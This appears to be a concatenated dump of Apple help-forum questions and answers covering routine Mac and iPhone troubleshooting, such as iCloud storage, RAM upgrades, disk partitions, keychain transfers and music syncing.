- making it meaningless to steal if it doesn't function. I will be entirely honest with you, this question does seem extremely shifty...But if the device is indeed yours, and you have proof of purchase, take it to a genius bar. They might be able to help.\n\nA: Something doesn't sound right, as if you restored somebody else's backup. I would take it to a Genius Bar or at the very least call Apple and explain your situation.\nAdmittedly, it does sound shifty...\n", "Q: How to retrieve emails from iCloud account that is full I recently received an email from Apple letting me know that because my iCloud storage was full I could not back up my devices and would not be able to send or receive mail. I did the usual deleting of unnecessary backups of emails, apps, and devices. I also purchased more storage. \nThis morning, I received my receipt for the new storage and a bunch of emails sent today. But I need the emails from yesterday and whenever they decided to shut down the account. How do I retrieve all the emails that I hope are in limbo somewhere?  Note: I sent an email from another account to see if I'd get an \"undeliverable\" message and nothing. \n\nA: This happened to me too. I spoke with Apple support on the phone and because my email was an iCloud email, they said there is most likely no way I would receive the emails I missed while my storage was full. The people sending the emails most likely received a bounce message indicating the mail was not delivered. \n", "Q: iTunes starts playing when disconnecting Bose Soundlink Mini i have a Bose Soundlink Mini connected to a Macbook Air. When the Soundlink turns off after a time (because of energy saver mode), iTunes automatically starts playing music. I didn't find any option to disable that, nor any information about others with the same problem. Do you have any idea, why this happens and how i can solve it?\n\nA: This (http://forums.macrumors.com/threads/how-to-stop-itunes-from-opening-with-bluetooth-speakers.1666895/) worked for me --\nIn Finder go to Applications and show package contents on iTunes.app. Inside the MacOS folder there is a unix script called iTunes, I renamed it iTunesclosed. Also renamed ituneshelper.app to ituneshelpdisabled.app\nRemove the iTunesHelper.app from starting on login via System Preferences -> Users and Groups\nAlso kill the iTunesHelper process via Activity Monitor.\nEdit: Note that you may have to do this every time iTunes is updated.\n", "Q: How do I remove purchased GarageBand content? I recently purchased GarageBand's additional content (the $4.99 for everything one) specifically to acquire the drummers. Now I've got around 10GB of unused content eating up a significant portion of my hard drive. How do I remove the sounds and loops installed by GarageBand?\n\nA: You should look for it in the following place, copy following and paste it in to the Go to Folder in the Finder.\n/Library/Audio/Apple Loops/Apple/Apple Loops for GarageBand\n\nKnow-how:\n*If you are wondering how I did it, since I do not use the Garageband:\nI used the mdfind -name Garageband in Terminal that showed me all locations for it.

I tried to hold down buttons but it won't unlock. How do I unlock it?\n\nA: The \"Tunes icon and power cord picture\" means the iPhone needs to be plugged into a computer running iTunes, and that should allow the system to finish whatever it needs to finish.\n", "Q: Hardware acceleration for flash videos in Google Chrome Is there any way to enable flash video hardware acceleration in Google Chrome? I get up to 300% cpu usage, while playing flash video. \nUsing OSX 10.9.5 and latest Chrome on a MBPr 13\" late 2013.\nIn Safari I get around 90% CPU usage. Which is bad, but not as bad.\n\nA: Step 1 would be to look the status of your Chrome GPU settings.\nPaste this \"chrome://gpu/\" in Chrome web address field.\nOn my MBA 10.9.5 Chrome Version 38.0.2125.101 it looks like this\nGraphics Feature Status\nCanvas: Hardware accelerated\nFlash: Hardware accelerated\nFlash Stage3D: Hardware accelerated\nFlash Stage3D Baseline profile: Hardware accelerated\nCompositing: Hardware accelerated\nRasterization: Software only, hardware acceleration unavailable\nThreaded Rasterization: Disabled\nVideo Decode: Software only, hardware acceleration unavailable\nVideo Encode: Hardware accelerated\nWebGL: Hardware accelerated\n\n\n\n*\n\n*Pending on your result (Flash- Not accelerated) proceed to step 2:\n\n\nDo following: \n\nTo force Chrome / Chromium to use hardware acceleration, open a new\n  tab, type \"chrome://flags\" (without quotes), search for \"Override\n  software rendering list\", enable it and restart Chrome / Chromium.\n\n\n\n*\n\n*Optional Step 3 (my settings)\n\n\nPaste this \"chrome://plugins/\" in web address field.\nDisable the Chrome build in Adobe Flash player aka PepperFlashPlayer.plugin\nIf you have not already have done so, get the Adobe Flash player from Adobe, that will be now used by Chrome.\n\nA: Thanks for sharing. It works for me with some additional adjustment.\nAll my flash videos on facebook stopped working. Black/ Green screen no video but with audio. Couldn't disable Flash settings hardware acceleration. Some how the flash menu hung after opening it up.\nSo this is the only workaround for me. From chrome://flags I disable \"Disable hardware-accelerated video decode\" and relaunch my Chrome browser. Now all Flash videos plays fine. I'm a happy person once more. :)\n\nA: This command allows me to stream content without running out of memory:\nGoogle-chrome --disable-gpu \n\n", "Q: WiFi problems in windows 7 boot camp I have a mid-2012 retina 15\" MBP.  WiFi works fine in OS X, but in boot camp (windows 7 x64):\n\n\n*\n\n*I can see, but cannot connect to my 5 GHz network (n only, 40 MHz channel)\n\n*I can connect to 2.4 GHz (BGN, 20 MHz channel), but the connection has latency spikes and frequently drops.\n\n\nWifi chip is Broadcom BCM43xx, router is Linksys E3200 running firmware 1.0.04. Signal strength does not seem to be a factor. I've also tried updating the boot camp drivers, device manager shows \"Broadcomm 802.11n Wifi Adapter\", driver version 6.30.223.215. Is there something I could tweak to improve compatibility?\n\nA: I have the same problem too. I've solved this with updating the driver but with an old driver Broadcom version 5.106.199.1 (11/13/2012). Here is the steps :\n\n\n*\n\n*Left click on your wireless adapter in Device Manager\n\n*Choose \"Update Driver Software..\"\n\n*Pick \"Browse my computer for driver software\"\n\n*Pick \"Let me pick from a list of device drivers on my computer\"\n\n*Choose \"Broadcom....Version: 5.106.199.1 [11/13/2012]\"\n\n*Next..

Normal speed, no slow motion.\n\nA: I checked now and it is 130 MB / minute.\n\nA: 60 FPS 10 minutes video 1.3 GB.\n\nA: My iPhone6 22 minute video is 3.1GB. 3100/22 = 140MB per minute. \nThis is 1920 x 1080 (1080p) @ 30 fps.\nI checked the Frames Per Second in Settings>Photos & Camera>Record Video in my iPhone6 menu. I saw it was 1920x1080 pixels per frame when I imported the video to my Macbook using a program called Image Capture.\n", "Q: I am not able to delete single text messages in a conversation since updating to iOS 8 Before iOS 8 I could click on a text, get the More option and see a trash can on the bottom of the screen. This would allow me to delete a single text from a conversation. \nNow there is only a camera in the place the trash can used to be. I have reset my phone and the trash can comes back, but only briefly. Today I totally erased my phone and the ability to delete single text messages from a conversation still does not last more than a few texts.\nIs there a way to make this feature persist?\n\nA: If you double-tap on a message rather than single-tap, up pops a \"Copy/More...\" selector, and hitting \"More...\" gives you the trash and forwarding arrow icons (along with the ability to select other messages to delete at the same time.)\nIf the icons do not apear, or if they stop apearing, there is something not working the way it does for me. Some people find that the icons re-appear after a restart (if only for a short time). Perhaps completely \"quitting\" the application would help? If you double-click on the home button, and then \"upswipe\" the Messages window does that have any effect when Messages is re-started?\n", "Q: Does Healthkit Sync? Does Healthkit sync between devices? For example, if I have IOS 8.02 installed on  iPhones 4S and 5S, should I expect that data on the 5S Health Dashboard will appear on the 4S Health Dashboard? \n\nA: On iOS 8.0.x the health app does no syncing of any health kit data or configuration. \nYou only get the app on iPhone and iPod builds and there is no cloud component of the data. It resides on each device and only gets backed up to iCloud as a device backup and not synced like other things can in iCloud such as calendar and contacts data. \n", "Q: New to Macbook Pro, need help upgrading I was recently gifted an old Mid 2010 Macbook Pro with the following specs listed here:\nhttp://www.everymac.com/systems/apple/macbook_pro/specs/macbook-pro-core-i7-2.66-aluminum-15-mid-2010-unibody-specs.html\nI would like to do a few things to it, but I have never owned an apple computer before and I know there are some restrictions on the hardware i can purchase to upgrade it.\nThese are the things I want to do\n1) Upgrade Ram: Currently it has 2x2GB of RAM in it. This model is rated for up to 8GB but I have been reading online and it seems some people have been able to successfully install 16GB of RAM, so i am confused. Does anyone have a definitive statement on whether or not this Macbook Pro will work with 16GB of RAM? If it does accept 16GB total which RAM should i buy for a Macbook Pro like this? If it only accepts 8GB total which RAM should i buy? And I know the clock speed must be 1066Hz for this Macbook Pro, but can i use DDR3, or DDR4 RAM? Does the DDR type matter?\n2) Install Secondary Hard Drive: I am not 100% so i need someone to inform me but i believe there is space in this Macbook Pro for a second hard drive. Does the CD Drive need to be removed in order for a second Hard Drive to be put in? Or is there simply space inside it for a second hard drive but not installed by Apple? Either way I would like to install an SSD into it and install the Operating System onto that SSD. Which SSD can i look to buy that is compatible with this  Pro?\n3) Fresh install of Mac OSX: As it currently stands my friend who gave this laptop to me didn't erase his data. I am uncomfortable with this and want a fresh start. How do I do a fresh install of Mac OSX Mavericks (or should i wait for Yosemite?). Where can i buy a Disk/USB for it (or make a disk/USB for it) to do a clean install and how do i format a Macbook Pros hard drive and install fresh? Should this be done at an apple store?\n4) Higher Screen Resolution: This is my lowest priority and I don't think it is possible to do without major invasive changes to the Macbook Pro but i want to know if it is possible. Currently the Max Resolution on the Device is 1440x900, i would like to know if it is possible to replace the LCD with one that is 1920x1080 for high resolution.\n\nA: 1) RAM Upgrade\nAs far as I'm aware, the laptop cannot be upgraded beyond 8GB. This is due to restrictions by the CPU and chipset architecture in that particular model. Unless you are a real power user who does lots of video editing or likes to have a lot of applications open at a single given point in time, 8GB should be perfectly fine.\nDDR4 ram is NOT supported. It is only a new technology (literally only about a month old) and presently is only compatible with 3 CPU's that were released this year and certain motherboards with a specific chipset and socket for these new CPU's. Bottom line is, your 2010 laptop will not be able to use this type of memory. DDR3 is your only option given the type and generation of hardware inside the laptop.\n2) Secondary HDD\nIt is possible to install a second hard drive, however this will involve removing the CD drive. This will also cause trouble if you ever take the laptop to a genius bar for technical assistance on an unrelated failed component as you have tinkered with the laptop beyond what is allowed. If you're willing to take the risk and do some DIY within the laptop, this is the part that will allow you to install a secondary drive.\n3) Fresh Install of OSX\nYes. Wipe it clean now with Mavericks. Updating to Yosemite when it launches will be extremely simple so there's no need to wait for it. Use this guide to help you create a bootable installer USB drive to completely wipe the drive and put a fresh install of Mavericks on the computer.\n4) Higher screen resolution\nUnfortunately you cannot modify the screen resolution. No such third party screen exists. Generally speaking 15\" laptops (especially around the 2010 time period) never had 1920x1080 resolutions and only few laptops today have them (commonly known as high density displays, or in the apple world, retina displays). Only the 17\" model had a resolution that high (1920x1200 - 16:10 aspect ratio) and that model has been discontinued for a few years now. So I'm afraid that you're stuck with the resolution you've got.\n", "Q: Is there an iOS timelapse app that saves frames to camera roll? I'm looking for an app that will save individual frames to the camera roll as it goes, at something like a 1-5 second interval. I'm having trouble finding any apps that don't expect you to use them to make the final video; I'd rather do that at home on the computer where I can use the images along with the ones off the SLR.\n\nA: The pro version of Joby's camera app \"GorillaCam Pro\" will do this. \n", "Q: Macbook pro reboot questions i went to use my macbook pro and it appeared with a blinking question mark i got past that page to the OS X Utilities but how do i reboot it without losing everything i have? I don't have a disc or a time machine backup. \n\nA: OK, blinking ? mark means it lost your boot sector.\nSometimes that can be easy repaired by using the OS X restore function.\nPress and hold cmd+r during the start up to get in to the recovery mode.\nPending your computer type and age it might have it already on your hard disk and it will use it to repair your OS X without impacting your personal files.\n", "Q: Which RAM to buy for mid 2010 15 Inch Macbook Pro I am looking to upgrade my 15 inch macbook pro from 4GB to 8GB of RAM. I have never upgraded anything on a macbook before and I am wondering how important is the specific RAM that i purchase? I read in a couple places than only OWC and Crucial RAM works with my macbook pro. Is this correct? Or can i buy any two DDR3 1066Hz 4GB RAM and just slot it into my Macbook Pro?\n\nA: The brand shouldn't really matter. I have G Skill in mine with no problems. The stock was Samsung. The trouble with that specific model is that it doesn't clock down faster RAM properly thanks to some hardware bug with the Nvidia chipset. It's very important to only use 1066 MHz DDR3 with this model (you can usually get away with faster on other models). I had 1333 MHz RAM for a while and I had kernel panics all over the place.\nThe actual specifications are here:\n\n  \n*\n  \n*Double Data Rate Small Outline Dual Inline Memory Module (DDR3) format\n  \n*30mm (1.18 inch)\n  \n*2 GB or 4 GB\n  \n*204-pin\n  \n*PC3-8500 DDR3 1066 MHz type RAM\n  \n\n\nA: http://www.crucial.com has an app you can download to tell you which you need. Kingston & Corsair have drill-down selectors, but Crucial's is far easier.\n", "Q: How do I search Recent Calls on iPhone? I am looking for a phone number in my history. All I know is the area code 808, which will narrow it down immensely, and its having occurred between a month and two months ago.\nHow can I search the call history for the area code?\niPhone 5s, iOS 7.1.2\n\nA: Searching for contact numbers is possible through FaceTime.

This is its schema\nPartition1: 50GB  \"MavericksBackup\": Bootable backup\nPartition2: 187GB \"Home Data\": Absolutely Empty\nPartition3: 12GB  \"Install OS X Mavericks\": it contains only the bootable app to install Mavericks\n\nNow I'm trying to Erase the Partition3 from Disk Utility and it fails with the following error:\nThe requested size change for the target disk or a related disk is too \nsmall. Please try a different disk or partition, or make a larger change.\n\nWhat that even means?\nI have tried to delete or resize also the Partiton2 and I get the same error. \nI suspect the problem was created by Carbon Copy Cleaner: I've used it to copy everything from my internal HD to Partition1 to make it bootable. At the beginning of the process a warning message told me that in order to make Partition1 bootable I also had to create a recovery partition. I let it handle it.\nNow, in fact I don't see the Recovery HD partition from disk utility but if I launch diskutil list I do get this (different) list of partition, including the Recovery one, not visible from Disk Utility:\n/dev/disk1\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:                  GUID_partition_scheme            *250.1 GB   disk1\n   1:                        EFI EFI                     209.7 MB   disk1s1\n   2:                  Apple_HFS MvaricksBackup          49.9 GB    disk1s2\n   3:                 Apple_Boot Recovery HD             650.0 MB   disk1s3\n   4:                  Apple_HFS Home Data               187.3 GB   disk1s4\n   5:                  Apple_HFS Install OS X Mavericks  11.6 GB    disk1s5\n\nNot sure how to solve this? I would really avoid to reformat the whole disk...\nEDIT: I started the disk utility in debug mode with this terminal command defaults write com.apple.DiskUtility DUDebugMenuEnabled 1 then Debug menu and Show Every Partition. This in fact shows the extra EFI and Recovery HD partition but that didn't help me solving the problem.\n\nA: I did fix this by resizing (making it a bit smaller) the Partition1.\nAfter doing this I was able to delete/resize all the other partitions.\nWell, I have no idea why this happened, so this is not a real solution but probably a bug of diskutil.\n\nA: I have found that using Recovery Partition Creator 3.8 works for me.  I use Carbon Copy Cloner to clone the other partitions but Recovery Partition Creator for the Recovery HD partition.  It appears to handle the issue of removing partitions after the Recovery HD partition properly, and also works if you have left free space after the volume that the Recovery HD partition is created from.\nI haven't done exhaustive testing, but so far so good.\nhttp://musings.silvertooth.us/2014/07/recovery-partition-creator-3-8/\n", "Q: iMessage on iPad: how do I know when the message is an sms or not?

I find it much more useful to see the next six weeks from today, than to see the rest of this arbitrary calendar month!  Also the text color (rather than the silly dot) indicates which calendar an entry is associated with.  Weather forecasts for the next ten days are also added (optionally), which is great for planning outings!

How do I get music which I have ripped from CDs into iTunes onto my iPhone so I can listen to it? It shows up in my library but I can't get it to sync to my iPhone.\nI've clicked on the iPhone icon, clicked music and checked the album that was ripped. I've then synced the device but it but never shows up in my music on my iPhone.\nRight now I'm dragging the songs to the iPhone icon but that doesn't look to be working ether. In my iTunes library the ripped album shows up in Compilations—I don't know what that means or how to get the album into the library itself I feel that's the problem because I've ripped a CD once before and it just showed up in my iPhone and library with no problem.\n\nA: If you use the menu \"File\" -> \"Get Info\" when viewing one of the tracks, you can see if it is \"part of a compilation\" or not in the \"Info\" tab. \"Compilation\" albums are usually albums that have songs from more than a single artist or group, and they get handled differently by iTunes in a way that I have never really figured out.\nI work around this by typically not using the \"sync this album\" feature in iTunes, but rather I create a playlist (or multiple playlists I suppose) that I populate with the tracks I want synced:  \nIn iTunes on your computer you will need to select what music you want to sync. When the phone it plugged into iTunes, and the phone is selected in the sidebar (you may need to select the menu item \"View\" -> \"Show Sidebar\") one of the tabs beside the \"Summary\" of the phone is for \"Music\" where you can set exactly which playlists, artists, albums, and genres get synced. I find it convenient to have at least one playlist called something like \"for-my-iphone\" that I can conveniently add any individual tracks that I want synced to the phone, in addition to any of the other possible selection methods.\nIncidentally, on the \"Summary\" page, it is probably worthwhile selecting the \"convert higher bitrate songs to 128 kbps\" in order to save a lot of room on your iDevice. With most headphones and listening environments it is almost impossible to notice the different sound quality. Checking this box might make the first sync a lot longer if the system needs to do a bunch of music conversion, but subsequent syncs will not be noticeably slower in my experience.\n", "Q: How to work around the issue that I can't access some iStore apps of a different country?

You can load things from multiple AppleID accounts onto your phone at the same time, but it can be a bit of a pain as it will leave you in the account you were last in and you may inadvertently get new items into a different account than you intended.

This rules out NAS.\nAS these are existing RAID arrays you can't simple merge them together to create a single new RAID. At least, you can't while keeping the data on them.\nEssentially, in one device you just need a 6+ array of the disks to be presented as individual drives to the new machine, which will then pull them together into the RAID.\nYou could also use any number of single, double, quad enclosures too, but, I'm assuming you want a single device.\nA device like this: http://www.tigerdirect.com/applications/category/category_slc.asp?CatId=4274&Nav=|c:4269|&Sort=3&Recs=10 would do it in one.\nPut the drives in, connect to your new laptop and start using RAID.\nIf you've happy to lose a drive, the Drobo's are pretty neat. Not the fastest, but very usable, and generally easier than normal RAID. It's the easier, most it-just-works storage solution.\nIf you want to get geeky, then ZFS is the best solution: https://openzfsonosx.org However, it's still essentially beta (despite being very stable), and it's not an officially support Apple filesystem. It'll give you a nice range of options to use your disks with. Again - this requires a rebuild, unless you were really cunning and broke the RAIDs up, kept the data on one half, at least the mirrored one, started a new ZFS and then copied the data over and created two mirrored vdevs in a pool together. You'd need a spare 2Gb drive in the meantime.\n", "Q: xemacs: Bad CPU type in executable OK.  So I worked around this error:\n/sw/bin/xemacs: Bad CPU type in executable.\n\nbut I don't understand why what I did worked and am curious.  All I did was replace /sw with what should have been an identical copy.\nA little background...  I've had this copy of xemacs since around 2000.  I love it and it's all configured just right.  Building xemacs from scratch was something I used to do way back when, but it was always such a pain that I tarred up /sw (probably originally installed using Fink) and have copied it from computer to computer since forever ago. I did this recently back in Jan '14 onto my brand new iMac running Mavericks and everything works fine.  Even more recently, I upgraded from 10.7 to 10.9 on my MacBook Pro at home.  I just installed xquartz and when I went to run my copy of xemacs, I got the bad CPU error.\nI couldn't understand why I was having trouble since my newer iMac at work could run it no problem.  After struggling with it for awhile, I tried simply tarring & copying /sw from the work iMac to my older laptop, and all of a sudden, it worked!\nBut /sw SHOULD be identical in every case here.  They both originated from the same copy of /sw that I've been using since ~2000.  Why would a fresh copy of /sw make any difference?  Here's some pastes from the command line:\n% /sw/bin/xemacs &\n/sw/bin/xemacs: Bad CPU type in executable.\n% sudo mv /sw /sw-old\n% sudo mv /Users/robleach/Downloads/sw /\n% /sw/bin/xemacs &\n%\n\nHome Laptop:\n% uname -a\nDarwin #### 13.3.0 Darwin Kernel Version 13.3.0: Tue Jun  3 21:27:35 PDT 2014; root:xnu-2422.110.17~1/RELEASE_X86_64 x86_64\n\nWork iMac:\n% uname -a\nDarwin #### 13.4.0 Darwin Kernel Version 13.4.0: Sun Aug 17 19:50:11 PDT 2014; root:xnu-2422.115.4~1/RELEASE_X86_64 x86_64\n\nDid the update from 10.7 to 10.9 muck around with what was in /sw?  Why did the new identical copy make it work?  From what I've read about this error, it seems like xemacs shouldn't even work at all since 10.7 - but it does!  I use it all the time at work.\n\nA: Running file on both executables will show you how the actual executable was compiled:\nfile /sw/bin/emacs\n\nThis will tell you why you're having issues running the file between different systems.\nObviously, with incompatible CPU types you'll face the error you're getting. \nRosetta was available for 10.6, but not from 10.7 onwards.

Have a new mac Mac Have all files from old Mac (did a backup before it died). Have been operating with new Mac for several months now.\nNeeded to use the signatures option in Preview & realized I never transferred them over from the old Mac's backup.\nSo I read this, Transferring Preview app signatures in Lion, and was able to snag the com.apple.Preview.signatures.plist file.\nBut, tho I have the keychain file(s) in the backup, how can I extract just the one I need for this without screwing up my current keychain data?\n\nA: *\n\n*Go to ~/Library/Keychains on your new Mac and make a copy/backup of your actual login.keychain with cmd D\n\n\n*Copy the old login.keychain in /Users/old_user_name/Library/Keychains from the backup to your desktop and rename it to loginold.keychain\n\n\n*Open Keychain Access.app and choose File -> 'Add Keychain...' in the menu, navigate to your desktop and select loginold.keychain\n\n\n*Now you have a new entry in Keychains named loginold. Choose loginold in Keychains and Passwords in Category\n\n\n\n*Select the object Preview Signature Privacy and drag it to the keychain login in Keychains. You will be asked for a password. Enter the password for the old keychain (probably your old user password) and choose Always Allow or Allow. Now the object will be moved to your login keychain.\n\n\n*Choose login in Keychains and Passwords in Category and check if the new object Preview Signature Privacy is present there.\n\n\n*If everything is ok right click loginold in Keychains and choose Delete keychain \"loginold\". If you choose Delete Files and References in the following dialog box the keychain loginold will be deleted from your desktop and in Keychains\n\n\n\n*Quit Keychain Access.app\n\n\n*Test everything with Preview.app\n\n\n*If everything went well go to ~/Library/Keychains and delete the file login copy.keychain built for safety reasons in step 1.\n\n\n*If something went wrong, you might revert to your previous keychain by deleting login.keychain in ~/Library/Keychains and renaming login copy.keychain to login.keychain. Then i usually log out and in again or restart my Mac to be save.\nSlightly alternative way if the object Preview Signature Privacy is already present in your keychain login:\nPerform the steps 1-4 from above\n5. Locate the Preview Signature Privacy in loginold in Keychains and Passwords in Category and double click to edit.\n6. Click the Show password checkbox and enter the old user password\n7. Now the password used to encrypt the signature images is visible. Copy & paste it into a text editor and save the file or paste it directly into the password field of Preview Signature Privacy in your keychain login.\nAny by Preview.app previously signed/protected object on your new Mac might be inaccessible then though.\nContinue with the steps 7-11 from above\n", "Q: Can't seem to sync albums that weren't purchased from the itunes store to my IPhone 5c I recently got a new iPhone 5c. When I tried to sync my music from iTunes to my phone, it only synced songs and albums that I had bought from the iTunes store. All of the music that I had uploaded from my own albums does not seem to sync. Can anyone tell me why and how to fix it. \nP.S. Besides my iPod, this is my first Apple product, so I don't know anything about it. \n\nA: In iTunes on your computer, you will need to select what music you want to sync. When the phone is plugged into iTunes and the phone is selected in the sidebar (you may need to select the menu item \"View\" -> \"Show Sidebar\"), one of the options beside the \"Summary\" of the phone is for \"Music\" where you can set exactly which playlists, artists, albums, and genres get synced. I find it convenient to have at least one playlist called something like \"for-my-iphone\" that I can conveniently add any individual tracks that I want synced to the phone, in addition to any of the other possible selection methods.\nIncidentally, on the \"Summary\" page, it is probably worthwhile selecting the \"convert higher bitrate songs to 128 kbps\" in order to save a lot of room on your iDevice. With most headphones and listening environments it is almost impossible to notice the different sound quality. Checking this box might make the first sync a lot longer if the system needs to do a bunch of music conversion, but subsequent syncs will not be noticeably slower in my experience.\n", "Q: If an iPhone stolen and they restart it can it be tracked? If my iPhone was stolen and they reset and everything got deleted will I still be able to track it if everything has be deleted?\n\nA: If they deleted everything, then no... I guess you could then contact the police or something, resetting the iphone will cause the \"find my iphone\" feature to be disabled so yeah...\n\nA: Nope they can't track it so its pretty much useless I wouldn't even try just a waste of time I just demanded another phone and the company eventually gave in\n\nA: No, resetting the iPhone will disable Find my iPhone and your iCloud data will be deleted.\n", "Q: How to set positioning/filling of desktop background image with AppleScript How can I set the positioning/filling of the desktop background image from the command line with one of the available options listed in the Desktop & Screen Saver preferences:\nCrop, SizeToFit, FillScreen, Centered, Tiled\nI can set the desired background image itself using:\nosascript -e \"tell application \\\"Finder\\\" to set desktop picture to POSIX file \\\"/Library/Desktop Pictures/Beach.jpg\\\"\"\n\nHowever I'm not sure how to set the positioning/tiling.\n\nA: According to\n'AppleScriptEditor' > File > Open Dictionary >\n   Finder > Legacy Suite > Application > desktop picture\n\nall you can do is set the picture.\nThere are references to messing about with the .plist file, but the internet (and Apple) are silent on an Applescript-approved route.\nThis plist is empty for me in Sierra:  ~/Library/Preferences/com.apple.desktop.plist so I imagine Apple have hidden what used to be there inside one of their even less well documented databases.\n", "Q: how to move a video from photo to icloud I have very little space on my 16Gb iPhone, however I have a ton of space now in iCloud, how can I move videos from my iPhone to iCloud?\n\nA: Unfortunately, iCloud will not sync your videos from your iPhone.  They will not be available in your photo stream or when you do a restore.  \nCheck out For more reference\n\nA: You could use a different cloud service.\nDropbox offers 2GB of free space (or 1TB for $9.99 a month or $99 a year) When you connect your phone, it will sync your photos & videos under a folder called \"Camera Uploads\".  Once your videos are in your dropbox account, you can safely delete them from your phone and get that space back.\nAlso, Google Drive is very reasonable.  100GB for $1.99 a month.  Connect your phone and manually copy your videos.\n\nA: Assuming you are talking about videos that are in Photos:\nYou need at least iOS 8.0.2 to do this.\nGo to Settings -> iCloud -> Photos -> Enable iCloud Photo Library\n(yes it works for videos as well)\nIt's still in beta so read the warning it will show you carefully.\n", "Q: Cannot get free apps from App Store after moving abroad I tried to load a free app, but as I have moved to Spain from the UK it wouldn't accept it. I had to change my Google password and I have tried to change my address from my iPhone but it won't let me.\n\nA: Often, if you can't download (even free) apps from the App Store, this is because your payment information is not valid (or no longer valid).\nFrom the Settings app, go to the App Store settings, then tap on your Apple ID in blue at the top. After typing your Apple ID password, tap on Payment Information and make sure all the data is present, and correct.\nAlso - you had to change your Google password? I am confused by this ...\n\nA: You mention changing your Google Password from your iPhone, so I'm not sure if you are really talking about your AppleID password (for the iPhone App Store) or your Google Play password.  My answer assumes you really mean the AppleID.\nApple has a separate App Store for each country.  Many apps are available at multiple App Stores, but some are limited to specific countries' App Stores.  To  use the App Store for a given country, you need to have a Payment Method for that country.  This can be a credit card, or an iTunes card specific to that country.  If you need to use an Apple Store in a country you aren't in, and don't have a credit card for, you can get a friend or relative to buy you an iTunes card and email you the code.  You may also be able to purchase an iTunes card for that country on eBay.  You CANNOT use an iTunes card from one country in the App Store for another country.\nYou can load apps from multiple AppleIDs (and thus, multiple countries) onto you iPhone at one time.  It's a bit of a pain, and best to keep one as your \"main\" AppleID and only use the other for apps that absolutely require it, or you'll end up being switched back and forth a lot and it gets messy.  \n", "Q: 2 Clash of Clans account on the same Game Center account At first I started playing clash of clash of clans on my sister's iPad, with her Game Center account.

I have always wondered whether it was possible to use the same phone number on an \"emergency phone\" in case the main one gets lost.\n\nA: Yes\nYes it is possible. I think they developed this for the fixed car-phones. Some providers support 2 simcards with the same number. How it works:\n\n\n*\n\n*The phone that had a connection and some communication to the cell-tower last will be the primary phone.\n\n*When you make a call, that phone becomes the primary phone.\n\n*When you change locations (change cell-tower), that will be your primary phone.\n\n*If your primary phone is not on the network, your secondary phone will become the primary phone.\n\n\nThe primary phone is the only phone that can receive calls. Both phones can call.\nAsk your provider for more info.\nThis is based on my experience (Vodafone, Netherlands). And I am sure there are better descriptions out there ;)\n\nA: I was always under the impression that only one SIM card at a time could be registered to any given phone number, but another answer suggests otherwise. \nIf you lose your phone and contact your network to report it missing then it would be technically possible for them to transfer your number to a different SIM card that you already possessed on the same network, but it would be a matter of their policy whether they were willing to do that. Obviously they would be able to transfer your number to a new SIM card that they would send out to you, but you'd have to wait to receive it and I'm sure they would make a charge for this.\nIt should be possible to set up call diversion to a different phone number if your phone is lost, but again this depends on whether your network chooses to offer the service - you can normally do this from the phone number you are diverting calls from but obviously in the situation you suggest you wouldn't have that phone.\nThis is really a question to ask your network as the answer will come down to what they are able or willing to provide.\n\nA: Your cellphone company probably has a way to forward your calls. For example AT&T (who I use) says that you need to call them to forward your number to another phone. \nPhone companies use to offer the ability to ring multiple phones simultaneously or in rotation, but I don't see that AT&T offers this. (Although maybe they do offer it in business plans.)\nOther options are to use a service like Line2 or SendHub however these would be expensive options if you don't need their other services. \n\nA: The short answer is no.\nStrictly the phone does not have a number. It has an International Mobile Subscriber Identity or IMSI which serves to identify the SIM to the network. These must be globally unique. \nThe \"number\" which people call is the MSISDN.\nThe network uses the IMSI to locate and communicate with the phone and the Home Location Register HLR (which is a database) to translate between MSISDN and IMSI.\nWhen I last worked as a mobile network planner, I was not aware of any standard way of having a relationship between MSISDN and multiple IMSI, but it is trivial to change which IMSI is related to a MSISDN. This is how carriers can change your SIM and the basis of Mobile Number Portability.\nI have not kept up with the latest standards, but the only way you could find out is to contact your network operator.\nAs mentioned by others you could have 2 subscriptions, and forward a single MSISDN to the 2nd backup service, but this usually involves additional call charges.\n\nA: It is possible since it is available service over seas.\n\"It used to be that you had to go overseas to see and enjoy the latest in mobile phone technology. The playing field has certainly leveled, but there are still some practices that have yet to be adopted by the United States. One such practice is the ability for a user to have more than one SIM card for one mobile phone number.\" Read More here http://www.geek.com/mobile/do-you-want-two-sim-cards-for-one-phone-number-1024011/\n\nA: A number of providers (e.g. ATT's NumberSync, Telstra's 'One Number') are offering this service now and with the advent of cellular enabled Things (e.g.  Apple Watch 3, Samsung Gear S2 etc) it seems it's only going to grow - see Apple's list of supported cellular carriers for their Watch 3.

Now I'm making a clean install of Mavericks and I have a couple of questions:\n1) What are the real performance advantages of having multiple partitions? Like one for the system, one for itunes, one for Home, ectr. Or maybe constantly accessing other partitions would in fact make the system slower? Reading around the internet literally everyone has a different opinion on this.\n2) I'd like to make a good clean up before doing a reinstall: does it make any sense to format only the primary partition where the system will be installed leaving the other partitions for a re-formatation in the future (whem I'll have the necessary external hd to backup). Or it would be better a full hard disk erase and restart from there? And why?\nThanks\n\nA: I have never, and I mean never, even back to the \"classic\" Mac O/S days (going back to system 6) partitioned a drive into smaller chunks.\nPerformance gains were supposedly about different parts of a rotational drive being faster than others (EG quicker seek to sectors near the physical hub). There may also have been some O/S speed gains in some O/S if you keep parts on different partitions, though I am not entirely sure as it has been years.\nThat said partitioning a drive does have some benefits, mostly when it comes to backup as it can be easier to back up all of one drive allowing you to easily exclude those things you don't want or need. On the other hand most backup programs allow easy inclusion or exclusion of types of file based on location and multiple other criteria.\nPersonally I have never bothered with partitioning as the few times I have had to use it I found it limiting to what I wanted or needed to do on the computer. In other words I would occasionally run out of room on partition \"A\" with plenty left on the other partition(s).\nThere is nothing inherently wrong with partitioning a drive but there is no real pressing need (or requirement) to do that with O/S X. And if there is no need/requirement I go with the first principle of good engineering: \"KISS\" or Keep It Simple, Stupid ;-)\nAs for question two, I suppose it depends on the availability of available backup space. If you have enough room to back up everything, do so and reformat the drive as one partition, then restore what you need to the fresh O/S install drive and go from there.\n\nA: 1) There are no performance gains from running multiple partitions. The drive is accessed sequentially and having 200 different partitions won't change that (the OS will not access each partition in parallel). The only way to boost storage performance is to run more than one using RAID0 (striped). Each hard drive can then be accessed separately and in unison, effectively doubling read speeds as data is segmented equally (in stripes) across both devices (note that write performance remains unaffected). One hard drive runs only as fast as one hard drive, regardless of how many partitions it has.\n2) OS X installs intelligently. The OS install point is /System. Your user account (and the majority of all your files) reside in /Users. /Library holds both system and user (system wide) modifications and libraries. Drivers and other low level files are also installed here. If OS X is ever 